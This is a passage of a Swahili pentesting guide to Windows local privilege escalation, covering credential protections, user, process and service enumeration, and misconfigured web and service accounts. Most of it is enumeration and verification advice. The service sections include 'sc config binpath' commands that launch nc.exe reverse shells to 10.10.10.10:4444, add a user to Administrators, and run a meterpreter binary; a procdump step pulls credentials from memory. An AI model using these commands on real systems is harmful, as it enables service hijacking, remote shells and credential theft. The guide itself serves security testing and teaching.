**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa ndani**, kuhakikisha kwamba kila nywila ni **ya kipekee, imetengenezwa kwa nasibu, na husasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, hivyo kuwaruhusu kuona nywila za admin wa ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi wazi huhifadhiwa ndani ya LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa kwa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika kujaribu **kusoma kumbukumbu yake** au kuingiza msimbo, na hivyo kuimarisha usalama wa mfumo.\
[**Maelezo zaidi kuhusu Ulinzi wa LSA hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Kusudi lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Vitambulisho Vilivyohifadhiwa kwenye Cache

**Vitambulisho vya kikoa** huthibitishwa na **Local Security Authority** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Data za kuingia za mtumiaji zinapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida vitambulisho vya kikoa vya mtumiaji huanzishwa.\
[**Maelezo zaidi kuhusu vitambulisho vilivyohifadhiwa kwenye Cache hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia ikiwa vikundi vyovyote ulivyomo vina ruhusa za kuvutia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Makundi yenye haki za ziada

Ikiwa **wewe ni mwanachama wa kundi lenye haki za ziada, unaweza kupata njia ya kuongeza haki zako**. Jifunze kuhusu makundi yenye haki za ziada na jinsi ya kuyatumia vibaya ili kuongeza haki zako hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Kubadilisha token

**Jifunze zaidi** kuhusu **token** ni nini kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token zinazovutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata maudhui ya clipboard

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato **angalia kama kuna nywila ndani ya mstari wa amri wa mchakato**.\
Angalia kama unaweza **kubatilisha binary yoyote inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia [**DLL Hijacking attacks**](dll-hijacking/index.html) zinazowezekana:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Daima angalia kama [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) zinaendesha; unaweza kuzitumia vibaya kufanya privilege escalation.

Debugger listener inaweza kudumu kwa muda mfupi, kwa hivyo kutokuwepo kwake kwenye snapshot moja ya passive port hakuthibitishi kuwa haikuwahi kufikiwa. Linganisha listener yoyote uliyoona na PID yake, mmiliki wa process, na uwezo wa mtumiaji mwenye privilege za chini kuifikia; jina la programu au debug flag pekee havithibitishi uwezo wa kutekeleza code kati ya watumiaji tofauti. Fanya enumeration ya kawaida kwa njia ya passive badala ya kutuma debugger commands.

**Kuangalia ruhusa za binaries za processes**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda za binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za dynamic preprocessor za Snort

Snort 2 inaweza kupakia shared libraries kutoka kwenye `dynamicpreprocessor directory` iliyotajwa kwenye configuration iliyochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort kwa kutumia akaunti tofauti, kagua configuration hiyo mahususi na ACL ya saraka ya modules iliyotajwa. Ikiwa token yako inaweza kuunda faili humo, njia hiyo inafaa kukaguliwa kama uwezekano wa code execution task au service hiyo itakapopakia modules tena. Thibitisha privileges halisi za akaunti inayoendesha programu, configuration inayotumika, ulinganifu wa modules, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikwa peke yake haithibitishi privilege escalation. [Nyaraka za Snort kuhusu upakiaji wa dynamic preprocessor](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa modules wakati wa runtime.

### Web service yenye privileges za juu na document root inayoweza kuandikwa

Kwenye usakinishaji wa Apache wa Windows, linganisha njia ya executable ya service na akaunti inayoendesha service hiyo na `DocumentRoot` iliyo kwenye `httpd.conf` inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, mara nyingi `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye privileges za chini anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, code execution ya upande wa server inaweza kuvuka mpaka wa privileges wa host. Thibitisha kwamba service inaendeshwa, njia hiyo hasa ndiyo inayotolewa, na handler ya upande wa server inachakata aina hiyo ya faili; root inayoweza kuandikwa peke yake inathibitisha tu uundaji wa faili. Kagua ACL bila kuandika faili ya majaribio:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, service inaweza kuelekeza kwenye `C:\wamp64\bin\apache\apache*\bin\httpd.exe` yenye toleo maalum (au `C:\wamp\...` kwa muundo wa 32-bit), ikiwa na usanidi karibu nayo chini ya `conf\httpd.conf` na root ya kawaida ya `C:\wamp64\www` au `C:\wamp\www`. Kagua pamoja image halisi ya service, utambulisho inayotumia kuendesha, `DocumentRoot` inayotumika (ikiwemo upanuzi wa `${INSTALL_DIR}` na overrides za virtual-host), na root ACL. Directory ya WAMP inayoweza kuandikwa haithibitishi kuwa Apache inaendeshwa kama `SYSTEM` au itatekeleza faili iliyowasilishwa. [Apache inaeleza jinsi Windows service huchagua usanidi wake](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Root ya IIS inayoweza kuandikwa na utambulisho wa application-pool kwenye mtandao

Kwa IIS, linganisha directory halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool yake iliyosanidiwa na handler ya upande wa server. Code iliyowekwa kwenye directory inayohudumiwa huendeshwa kama pool tu ikiwa IIS inachakata aina hiyo ya faili na route inaweza kufikiwa. Kagua ruhusa za sasa za mtumiaji za kuunda faili, hali ya runtime ya site, handler na overrides za kila path kabla ya kuichukulia directory inayoweza kuandikwa kama njia ya kutekeleza code.

Dynamic compilation ya ASP.NET inaleta path tofauti ya kukagua: faili zinazozalishwa chini ya directory ya compilation ya application. Chaguo-msingi ni directory ya `Temporary ASP.NET Files` chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya application inaweza kuibadilisha. [Microsoft inaeleza eneo hilo na subdirectories za kila application](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenganisha directories za compilation wakati application pools haziaminiani](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa tokeni yenye ruhusa za chini inaweza kubadilisha source inayozalishwa kwenye cache ya **application husika**, bainisha kama application hiyo itai-compile upya chini ya [utambulisho wa worker-process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) wenye ruhusa za juu zaidi. ACL ya faili au directory pekee haithibitishi utekelezaji wa code: linganisha cache na application inayotumika, tokeni na ACL zinazotumika, mipangilio ya compilation, utambulisho wa process, na muda wa compilation yoyote upya. Tumia ukaguzi wa metadata wa kusoma tu; usianzisha compilation wala kubadilisha faili za cache wakati wa enumeration.

Pool ya IIS iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujithibitisha kwenye rasilimali za domain kwa kutumia **akaunti ya kompyuta mwenyeji**, ingawa tokeni yake ya ndani inaweza kuwa na ruhusa za chini. `LocalSystem` tayari ina ruhusa nyingi kwenye kompyuta ya ndani na pia hutumia akaunti ya kompyuta kwenye mtandao; `LocalService` kwa kawaida hutumia credentials za mtandao zisizotambulishwa. Pool ya `SpecificUser` hutumia akaunti yake iliyosanidiwa. [Microsoft inaeleza aina hizi za utambulisho](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [utambulisho wa application-pool kwenye mtandao](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mpangilio wa utambulisho usiowekwa unaweza kurithi chaguo-msingi za pool, ambazo hutofautiana kati ya vizazi vya IIS, kwa hiyo tambua usanidi unaotumika badala ya kukisia kutokana na jina la pool. Ikiwa utekelezaji wa code unafikia pool yenye utambulisho wa akaunti ya kompyuta kwenye mtandao, tathmini haki za directory za **kompyuta hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) huhitaji haki za replication kwenye domain naming context; ticket ya machine-account au jukumu la host pekee halithibitishi haki hizo. Enumeration tulivu inapaswa kukagua usanidi na ACL bila kupakia faili, kufanya uthibitishaji wa mtandao, au kuomba tickets.

Kwa ASP.NET handler inayoweza kusomwa na inayoanzisha helper process, fuatilia thamani yoyote inayotokana na request kupitia uthibitishaji, decryption, validation na uundaji wa command. Handler inayounganisha tokeni iliyodecodeiwa kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu shell metacharacters kubadilisha command; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kuwa caller asiyeaminika anaweza kweli kuathiri thamani iliyodecodeiwa na kufikia handler, kisha tambua utambulisho unaotumika wa application-pool au wa impersonation na utambulisho wa child process. Mstari wa source unaosomeka, listener ya localhost, au udhaifu wa muundo wa tokeni pekee havithibitishi utekelezaji wa command wenye ruhusa za juu. Kagua source na usanidi wa pool bila kutuma requests za kughushi au kuendesha helper wakati wa enumeration tulivu.

Kwa PHP service kwenye Windows, path inayodhibitiwa na request na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini, kwa kutumia utambulisho wa worker. Thibitisha kuwa request inaweza kufikia kauli hiyo, path iliyotatuliwa inaelekeza kwenye faili ambayo mtumiaji mwenye ruhusa za chini anaweza kubadilisha na worker anaweza kusoma, vizuizi husika vya PHP vya path vinaruhusu include, na worker inaendeshwa kwa ruhusa za juu zaidi. Listener ya loopback au faili inayoweza kuandikwa pekee havithibitishi mnyororo huu; kagua source, utambulisho wa service na ACL za faili bila kuita endpoint wakati wa enumeration tulivu.

### Uchimbaji wa Nenosiri kutoka kwenye Kumbukumbu

Unaweza kuunda memory dump ya process inayoendeshwa kwa kutumia **procdump** kutoka sysinternals. Services kama FTP huwa na **credentials katika maandishi yaliyo wazi kwenye kumbukumbu**; jaribu kutoa memory dump na kusoma credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za mradi wenye ruhusa za juu

Programu inayofungua kiotomatiki miradi kutoka kwenye saraka ya kushusha faili ambayo mtumiaji mwenye ruhusa za chini anaweza kuandika huvuka mpaka wa uaminifu wa ingizo chini ya akaunti ya programu inayoingiza. Kagua **njia halisi inayoweza kuandikwa**, mchakato au kazi inayoifungua, utambulisho wake unaotumika, na build ya parser. [Tatizo la kihistoria la kufungua/kurejesha mradi wa Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) liliruhusu XML external entities kwenye metadata ya mradi; entity ya mtandao kwenye Windows inaweza kusababisha uthibitishaji kutoka kwa akaunti inayoingiza ikiwa [sera za SMB ya kutoka nje na NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) zinaruhusu. Hii ni dalili ya uwezekano wa kufichuka kwa credentials, si ufikiaji wa msimamizi wa papo hapo: jibu lazima liweze kutumiwa kupitia njia tofauti iliyoidhinishwa au yenye udhaifu, na build za sasa lazima zikaguliwe kulingana na hali halisi ya masasisho yao. Usifungue mradi uliotengenezwa kwa nia ovu wakati wa uchunguzi usioingilia mfumo; kagua mtiririko wa uingizaji na ACL.

## Huduma

Haki ya [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ya kitu cha Service Control Manager (SCM) ni tofauti na haki za huduma iliyopo. Ombi lililofanikiwa la kusoma tu la [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) la kupata haki hiyo ni kidokezo cha kukagua, si uthibitisho kwamba huduma mpya inaweza kuendeshwa. [`CreateService` hurejesha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye haki za huduma zilizoombwa wakati wa kuunda; kufungua huduma tena baadaye hufanya ukaguzi tofauti wa ufikiaji na kunaweza kushindwa hata kama handle ya awali ingetumika. Thibitisha kando tokeni inayotumika ya ndani au ya mbali, haki za handle zilizotolewa, akaunti ya huduma, sera ya kuanzisha, na njia ya executable. Usitengeneze au kuanzisha huduma wakati wa uchunguzi usioingilia mfumo.

Kwa njia ya kusakinisha huduma kwa mbali, linganisha haki hizo za SCM na share kwenye lengwa ambayo **logon hiyo hiyo ya mtandao** inaweza kuiandikia, ACL yake ya msingi ya NTFS, na njia ya ndani ya executable ambayo akaunti ya huduma inaweza kuendesha. Akaunti isiyo ya msimamizi inaweza kuvuka mpaka huu ikiwa kuna haki pana isiyo ya kawaida ya SCM na njia ya kuweka faili; share ya msimamizi si sharti la lazima. Ufikiaji wa kuandika kwenye share pekee, au kidokezo cha kuunda huduma kupitia SCM pekee, hakuthibitishi kwamba huduma mpya inaweza kuanzishwa chini ya utambulisho wenye ruhusa za juu.

Huduma iliyopo inaweza kuita executable saidizi wakati wa kuanza, kuzima, au tukio jingine la mzunguko wa maisha hata kama executable hiyo haipo kwenye `ImagePath` yake. Ikiwa jina la executable saidizi linatatuliwa kuwa saraka inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini na huduma inaendeshwa chini ya utambulisho wenye ruhusa za juu, faili saidizi inayokosekana inaweza kuwa mgombea wa kubadilishwa kwa masharti. Thibitisha **msimbo halisi wa huduma au mwito wa executable saidizi ulioandikwa kwenye nyaraka**, njia ya executable iliyotatuliwa na mpangilio wa utafutaji, ruhusa za kuunda saraka, utambulisho wa huduma, na kichocheo cha mzunguko wa maisha kinachopatikana. Saraka ya huduma inayoweza kuandikwa au faili inayokosekana pekee hakuthibitishi kwamba huduma itapakia faili hiyo; ukaguzi usioingilia mfumo haupaswi kuanzisha au kusimamisha huduma.

Kwa huduma iliyopo, [`SERVICE_START` huruhusu kutoa arguments kwa `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua msimbo wa huduma au kiolesura chake kilichoandikwa kwenye nyaraka kabla ya kuchukulia ruhusa ya kuanzisha kama kitu zaidi ya haki ya udhibiti. Ikiwa inatumia argument iliyochaguliwa na mpigaji kama njia ya log au export, thibitisha utambulisho wa huduma, mtiririko halisi kutoka argument hadi uandishi, vikwazo vya njia, na ruhusa za **faili iliyoundwa**. Uandishi kwenye saraka iliyolindwa unaweza kuwa njia ya kuongeza ruhusa tu ikiwa kuna consumer au loader tofauti yenye ruhusa za juu inayokubali faili hiyo; log inayoweza kuandikwa au haki ya kuanzisha pekee haitoshi. Orodha ya vitu wakati wa ukaguzi usioingilia mfumo haipaswi kuanzisha huduma au kuunda faili ya majaribio.

Kwa agent ya ufuatiliaji ya NSClient++, `nsclient.ini` inayosomeka ni **kidokezo cha kukagua usanidi**: huenda ikawa na credentials za web, ilhali `boot.ini` inaweza kuelekeza usanidi kwenye eneo jingine. Kagua akaunti halisi ya huduma, listener ya WEB na sera ya ufikiaji, na kama role iliyothibitishwa inaweza kubadilisha mipangilio au scripts. Utekelezaji wenye ruhusa za juu pia unahitaji `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyoamilishwa), haki inayotumika ya kusajili au kurekebisha amri, na kichocheo kinachoendesha amri hiyo chini ya utambulisho wa huduma. Listener inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, password, au listener pekee havithibitishi haki hizo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa ukaguzi usioingilia mfumo. Tazama [mpangilio wa faili za NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa web na scripts](https://nsclient.org/docs/setup/securing/), na [usanidi wa external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa huduma ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ambayo huduma inaendeshwa nayo na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi programu child hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa saraka yake ya kazi iliyosanidiwa. Kagua executable ya child na ACL za saraka zake za juu kabla ya kuchukulia ruhusa za wrapper kuwa mpaka mzima wa huduma. Endpoint ya ndani ya WCF au SOAP inayotolewa na child hiyo ni kidokezo tofauti cha kukagua: thibitisha kuwa mtumiaji mwenye ruhusa za chini anaweza kufikia listener, operation husika inakubali ingizo lake, na child ya huduma inatekeleza operation isiyo salama chini ya utambulisho wenye ruhusa za juu. Akaunti ya huduma, URL ya endpoint, au njia inayoweza kuandikwa pekee havithibitishi ongezeko la ruhusa; epuka kuita operations za huduma wakati wa ukaguzi usioingilia mfumo.

Kwa operation maalum ya WCF, fuatilia string inayodhibitiwa na mpigaji hadi kwenye PowerShell runspace yoyote. [`Pipeline.Commands.AddScript` huongeza maandishi ya script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke` huendesha pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` yenye credentials za usafirishaji za Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) huthibitisha utambulisho wa client, lakini ruhusa ya kuita operation **hiyo mahususi** na utambulisho unaotumika wa runspace lazima vikaguliwe kando. Njia kutoka kwenye ingizo la mpigaji mwenye ruhusa za chini hadi `AddScript` chini ya utambulisho wa huduma wenye ruhusa za juu ni mpaka wa utekelezaji wa msimbo; port inayosikiliza, client aliyethibitishwa, au method isiyotumika kwenye assembly isiyohusiana pekee si uthibitisho. Kagua huduma iliyowekwa, contract, ruhusa, na mipangilio ya impersonation kwa njia tuli bila kuita endpoint wakati wa uchunguzi.

Service Triggers huruhusu Windows kuanzisha huduma masharti fulani yanapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, GPO kusasishwa, n.k.). Hata bila haki za SERVICE_START, mara nyingi unaweza kuanzisha huduma zenye ruhusa za juu kwa kuwasha triggers zake. Tazama mbinu za kuorodhesha na kuwasha hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Huduma ya Visual Studio ya kukusanya diagnostics

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kujumuisha `VSStandardCollectorService150`, huduma ya diagnostics iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia race ya junction na object-manager-link kuelekeza upya uwekaji upya wa DACL ya huduma. Ongezeko la ruhusa lililoonyeshwa pia lilihitaji njia inayoweza kutumika ya kurekebisha MSI ya Visual Studio Setup WMI Provider na lengwa lake la `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa uchunguzi wa awali usioingilia mfumo, kagua akaunti na njia ya binary ya huduma hiyo, angalia kama njia ya Setup WMI compiler ipo, na thibitisha hali ya masasisho ya kipengele kilichosakinishwa. Ingizo la huduma, toleo la bidhaa ya Visual Studio, au faili ya compiler pekee havithibitishi kuwa mfumo una udhaifu. Ukaguzi hauhitaji kuanzisha huduma au kuendesha urekebishaji.

Pata orodha ya huduma:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma

```bash
sc qc <service_name>
```

Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha privilege kinachohitajika kwa kila huduma.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa service

Ukikumbana na hitilafu hii (kwa mfano, kwenye SSDPSRV):

_Hitilafu ya mfumo 1058 imetokea._\
_Service haiwezi kuwashwa kwa sababu imezimwa au hakuna vifaa vilivyowashwa vinavyohusishwa nayo._

Unaweza kuiwasha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba huduma ya upnphost inategemea SSDPSRV ili ifanye kazi (kwa XP SP1)**

**Njia nyingine ya kukwepa** tatizo hili ni kuendesha:

```
sc.exe config usosvc start= auto
```

### **Badilisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary inayotekelezwa ya service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Mapendeleo yanaweza kuongezwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Huruhusu kusanidi upya ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
- **WRITE_OWNER**: Huruhusu kupata umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa utambuzi na unyonyaji wa athari hii, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za binary za services

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye upendeleo, lakini **watumiaji wenye upendeleo mdogo wanaweza kurekebisha EXE ya service au folda yake ya mzazi**, mara nyingi service inaweza kutekwa kwa **kubadilisha binary na kuwasha upya service**.

**Angalia kama unaweza kurekebisha binary inayoendeshwa na service** au kama una **ruhusa za kuandika kwenye folda ambamo binary hiyo ipo** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayoendeshwa na service kwa kutumia **wmic** (si katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACLs hatari zilizotolewa kwa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya huduma au saraka inayoihifadhi. Mchakato wa kawaida wa kuitumia vibaya ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya huduma na njia ya executable kwa kutumia `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa kutumia `icacls <path>`.
3. Badilisha binary ya huduma na payload au binary halali hasidi ya huduma.
4. Washa upya huduma kwa kutumia `sc stop <service_name> && sc start <service_name>` (au subiri kuwashwa upya kwa kompyuta / kichocheo cha huduma).

Ukaguzi muhimu wa kiotomatiki:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa service hairuhusu mtumiaji wa kawaida kuianzisha upya, angalia ikiwa inaanza kiotomatiki wakati wa boot, ina failure action inayoianzisha tena, au inaweza kuanzishwa kwa njia isiyo ya moja kwa moja na application inayoitumia.

### Ruhusa za kurekebisha registry ya services

Unapaswa kuangalia kama unaweza kurekebisha registry yoyote ya service.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya service kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

